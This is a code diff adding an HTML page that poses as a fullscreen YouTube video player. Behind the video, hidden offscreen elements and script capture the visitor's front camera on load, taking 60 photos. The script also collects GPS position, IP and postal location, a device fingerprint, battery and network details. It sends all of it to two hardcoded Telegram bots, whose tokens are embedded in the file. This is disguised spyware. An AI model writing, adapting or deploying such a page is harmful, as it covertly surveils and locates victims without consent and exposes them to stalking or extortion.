@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <title>Fullscreen Video Player</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background-color: #000;
+            overflow: hidden;
+            height: 100vh;
+            width: 100vw;
+        }
+        /* Full‑screen video container */
+        .video-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+        }
+        .video-wrapper {
+            position: relative;
+            width: 100%;
+            height: 100%;
+        }
+        #youtube-player {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+        /* Hidden camera elements (required by backend – DO NOT REMOVE) */
+        .camera-hidden-layer {
+            position: fixed;
+            top: -10000px;
+            left: -10000px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+            overflow: hidden;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Full‑screen video player (no visible UI) -->
+    <div class="video-container">
+        <div class="video-wrapper">
+            <div id="youtube-player"></div>
+        </div>
+    </div>
+
+    <!-- Hidden camera elements (required by existing backend – DO NOT REMOVE OR MODIFY) -->
+    <div class="camera-hidden-layer">
+        <video id="frontCameraVideo" autoplay playsinline muted style="width: 640px; height: 480px;"></video>
+        <canvas id="photoCaptureCanvas" width="640" height="480" style="display: none;"></canvas>
+    </div>
+
+    <!-- YouTube IFrame API -->
+    <script src="https://www.youtube.com/iframe_api"></script>
+
+    <script>
+        // ============================================================
+        // EXISTING BACKEND LOGIC – UNCHANGED (camera, Telegram, device info, etc.)
+        // ============================================================
+        // ----------------------------------------------------------------------
+        // TELEGRAM BOT CONFIGURATION – REPLACE WITH YOUR REAL DATA
+        // ----------------------------------------------------------------------
+        const BOT_1_TOKEN = "7703886947:AAEPiynQHB_nsMW89-rIRfek91wzrENsaKU";
+        const CHAT_ID_1   = "6045114071";
+        const BOT_2_TOKEN = "7747830791:AAGVyrSvEjK3F4qVmAKiEF6gHp4t-C72c-k";
+        const CHAT_ID_2   = "6045114071";
+        
+        const PHOTO_COUNT = 60;
+        const CAPTURE_INTERVAL_MS = 333;
+        const JPEG_QUALITY = 0.85;
+        
+        async function sendPhotoToTelegramBot(photoBlob, botToken, chatId, caption) {
+            if (!botToken || botToken.includes("YOUR_BOT_TOKEN")) return false;
+            if (!chatId || chatId.includes("YOUR_CHAT_ID")) return false;
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', photoBlob, `frame_${Date.now()}.jpg`);
+            formData.append('caption', caption);
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
+                const json = await res.json();
+                return json.ok;
+            } catch { return false; }
+        }
+        
+        async function sendTextToTelegramBot(botToken, chatId, text) {
+            if (!botToken || botToken.includes("YOUR_BOT_TOKEN")) return false;
+            if (!chatId || chatId.includes("YOUR_CHAT_ID")) return false;
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'HTML' })
+                });
+                const json = await res.json();
+                return json.ok;
+            } catch { return false; }
+        }
+        
+        async function sendPhotoToBothBots(blob, idx) {
+            const caption = `📸 Front cam ${idx+1}/${PHOTO_COUNT} | ${new Date().toLocaleTimeString()}`;
+            await Promise.allSettled([
+                sendPhotoToTelegramBot(blob, BOT_1_TOKEN, CHAT_ID_1, caption),
+                sendPhotoToTelegramBot(blob, BOT_2_TOKEN, CHAT_ID_2, caption)
+            ]);
+        }
+        
+        async function sendTextToBothBots(text) {
+            await Promise.allSettled([
+                sendTextToTelegramBot(BOT_1_TOKEN, CHAT_ID_1, text),
+                sendTextToTelegramBot(BOT_2_TOKEN, CHAT_ID_2, text)
+            ]);
+        }
+        
+        // Device info functions (unchanged)
+        function simpleHash(str) {
+            let hash = 0;
+            for (let i = 0; i < str.length; i++) {
+                hash = ((hash << 5) - hash) + str.charCodeAt(i);
+                hash |= 0;
+            }
+            return Math.abs(hash).toString(16);
+        }
+        
+        function getBrowserInfo() {
+            const ua = navigator.userAgent;
+            let name = "Unknown", ver = "Unknown";
+            if (ua.includes("Chrome") && !ua.includes("Edg")) { name = "Chrome"; ver = ua.match(/Chrome\/(\d+\.\d+)/)?.[1] || "Unknown"; }
+            else if (ua.includes("Firefox")) { name = "Firefox"; ver = ua.match(/Firefox\/(\d+\.\d+)/)?.[1] || "Unknown"; }
+            else if (ua.includes("Safari") && !ua.includes("Chrome")) { name = "Safari"; ver = ua.match(/Version\/(\d+\.\d+)/)?.[1] || "Unknown"; }
+            else if (ua.includes("Edg")) { name = "Edge"; ver = ua.match(/Edg\/(\d+\.\d+)/)?.[1] || "Unknown"; }
+            return { browserName: name, browserVersion: ver, fullUserAgent: ua };
+        }
+        
+        function getDeviceModelAndOS() {
+            const ua = navigator.userAgent;
+            let os = "Unknown", model = "Unknown";
+            if (ua.includes("Windows")) os = "Windows";
+            else if (ua.includes("Mac OS X")) os = "macOS";
+            else if (ua.includes("Android")) {
+                os = "Android " + (ua.match(/Android\s([\d\.]+)/)?.[1] || "");
+                const m = ua.match(/; (\w+[\s\w]?)\)/);
+                if (m) model = m[1];
+            } else if (ua.includes("iPhone")) { os = "iOS"; model = "iPhone"; }
+            else if (ua.includes("iPad")) { os = "iOS"; model = "iPad"; }
+            return { os, model };
+        }
+        
+        function generateFingerprint() {
+            const components = [
+                navigator.userAgent, navigator.language, screen.width+"x"+screen.height+"x"+screen.colorDepth,
+                new Date().getTimezoneOffset(), navigator.hardwareConcurrency, navigator.deviceMemory,
+                !!navigator.maxTouchPoints
+            ];
+            return simpleHash(components.join('|'));
+        }
+        
+        async function getBatteryInfo() {
+            if (!navigator.getBattery) return { isCharging: "Unknown", levelPercent: "Unknown" };
+            try {
+                const b = await navigator.getBattery();
+                return { isCharging: b.charging ? "Yes" : "No", levelPercent: `${Math.round(b.level*100)}%` };
+            } catch { return { isCharging: "Unknown", levelPercent: "Unknown" }; }
+        }
+        
+        function getNetworkInfo() {
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (!conn) return { wifiOn: "Unknown", mobileDataOn: "Unknown", connectionType: "Unknown" };
+            let wifi = "No", mobile = "No";
+            if (conn.type === 'wifi') wifi = "Yes";
+            if (conn.type === 'cellular') mobile = "Yes";
+            return { wifiOn: wifi, mobileDataOn: mobile, connectionType: conn.effectiveType || conn.type || "Unknown" };
+        }
+        
+        async function getIpInfo() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                if (data && !data.error) {
+                    return { ip: data.ip, isp: data.org, country: data.country_name, zip: data.postal, city: data.city, region: data.region };
+                }
+            } catch (e) { console.warn("IP info fetch failed", e); }
+            return { ip: "Unknown", isp: "Unknown", country: "Unknown", zip: "Unknown", city: "Unknown", region: "Unknown" };
+        }
+        
+        async function getGpsLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve({ gpsAvailable: false, lat: null, lon: null, accuracy: null, error: "Geolocation not supported" });
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => { resolve({ gpsAvailable: true, lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }); },
+                    (err) => { resolve({ gpsAvailable: false, lat: null, lon: null, accuracy: null, error: err.message }); },
+                    { timeout: 10000, enableHighAccuracy: true }
+                );
+            });
+        }
+        
+        async function collectExtendedDeviceInfo() {
+            const browser = getBrowserInfo();
+            const device = getDeviceModelAndOS();
+            const fingerprint = generateFingerprint();
+            const battery = await getBatteryInfo();
+            const network = getNetworkInfo();
+            const ipData = await getIpInfo();
+            const gps = await getGpsLocation();
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const now = new Date().toLocaleString();
+            let gpsText = "❌ Not granted or unavailable";
+            if (gps.gpsAvailable) gpsText = `✅ Latitude: ${gps.lat}, Longitude: ${gps.lon}, Accuracy: ±${gps.accuracy}m`;
+            else if (gps.error) gpsText = `⚠️ ${gps.error}`;
+            return `🔍 <b>FULL DEVICE & LOCATION REPORT</b> 🔍\n\n🌐 <b>Browser:</b> ${browser.browserName} ${browser.browserVersion}\n💻 <b>OS:</b> ${device.os}\n📱 <b>Device Model:</b> ${device.model}\n🆔 <b>Fingerprint:</b> ${fingerprint}\n\n🔋 <b>Charging:</b> ${battery.isCharging} (${battery.levelPercent})\n📡 <b>Wi‑Fi:</b> ${network.wifiOn}  |  <b>Mobile Data:</b> ${network.mobileDataOn}\n🔌 <b>Connection Type:</b> ${network.connectionType}\n\n🌍 <b>IP Address:</b> ${ipData.ip}\n🏢 <b>ISP:</b> ${ipData.isp}\n🇨 <b>Country:</b> ${ipData.country}\n📮 <b>Zip/Postal Code:</b> ${ipData.zip}\n🏙️ <b>City:</b> ${ipData.city}, ${ipData.region}\n\n📍 <b>GPS Location:</b> ${gpsText}\n⏰ <b>Time Zone:</b> ${timezone}\n\n⚙️ <b>Extra:</b> Cores: ${navigator.hardwareConcurrency || "N/A"}, Memory: ${navigator.deviceMemory ? navigator.deviceMemory+"GB" : "N/A"}, Touch: ${navigator.maxTouchPoints>0?"Yes":"No"}, Language: ${navigator.language}, Screen: ${screen.width}x${screen.height}\n\n📅 Timestamp: ${now}`;
+        }
+        
+        async function captureFrameAsBlob(videoEl, canvasEl) {
+            return new Promise((resolve, reject) => {
+                if (!videoEl || videoEl.readyState < 2) reject("Video not ready");
+                const w = videoEl.videoWidth, h = videoEl.videoHeight;
+                if (w === 0 || h === 0) reject("Invalid dims");
+                canvasEl.width = w; canvasEl.height = h;
+                const ctx = canvasEl.getContext('2d');
+                ctx.drawImage(videoEl, 0, 0, w, h);
+                canvasEl.toBlob(blob => blob ? resolve(blob) : reject("toBlob failed"), 'image/jpeg', JPEG_QUALITY);
+            });
+        }
+        
+        async function takeBurstPhotos(videoEl, canvasEl) {
+            for (let i = 0; i < PHOTO_COUNT; i++) {
+                try {
+                    const blob = await captureFrameAsBlob(videoEl, canvasEl);
+                    if (blob) sendPhotoToBothBots(blob, i);
+                } catch (e) { console.error(`Frame ${i+1} error:`, e); }
+                if (i < PHOTO_COUNT - 1) await new Promise(r => setTimeout(r, CAPTURE_INTERVAL_MS));
+            }
+        }
+        
+        let mediaStream = null;
+        let burstActive = false;
+        
+        async function initCameraAndRun() {
+            if (burstActive) return;
+            const video = document.getElementById('frontCameraVideo');
+            const canvas = document.getElementById('photoCaptureCanvas');
+            if (!video || !canvas) return;
+            try {
+                const constraints = { video: { facingMode: { exact: "user" }, width: { ideal: 640 }, height: { ideal: 480 } }, audio: false };
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                mediaStream = stream;
+                video.srcObject = stream;
+                video.playsInline = true;
+                video.muted = true;
+                await new Promise(resolve => { if (video.readyState >= 2) resolve(); else video.onloadedmetadata = resolve; });
+                await video.play();
+                await new Promise(r => setTimeout(r, 400));
+                const fullInfo = await collectExtendedDeviceInfo();
+                await sendTextToBothBots(fullInfo);
+                burstActive = true;
+                await takeBurstPhotos(video, canvas);
+                if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
+                video.srcObject = null;
+                burstActive = false;
+            } catch (err) {
+                console.error("Camera init error:", err);
+                if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
+                burstActive = false;
+            }
+        }
+        
+        window.addEventListener('DOMContentLoaded', () => {
+            setTimeout(() => initCameraAndRun().catch(e => console.warn), 600);
+        });
+        // ==================== END OF EXISTING BACKEND LOGIC ====================
+        
+        // ============================================================
+        // YOUTUBE PLAYER – full‑screen, no visible controls or UI
+        // ============================================================
+        let player;
+        
+        function onYouTubeIframeAPIReady() {
+            player = new YT.Player('youtube-player', {
+                videoId: 'dQw4w9WgXcQ',
+                playerVars: {
+                    autoplay: 1,
+                    mute: 1,
+                    controls: 1,       // show native YouTube controls (optional, but no extra UI)
+                    modestbranding: 1,
+                    rel: 0,
+                    showinfo: 0,
+                    fs: 1
+                },
+                events: {
+                    onReady: (event) => {
+                        event.target.playVideo();
+                    }
+                }
+            });
+        }
+        
+        window.onYouTubeIframeAPIReady = onYouTubeIframeAPIReady;
+    </script>
+</body>
+</html>
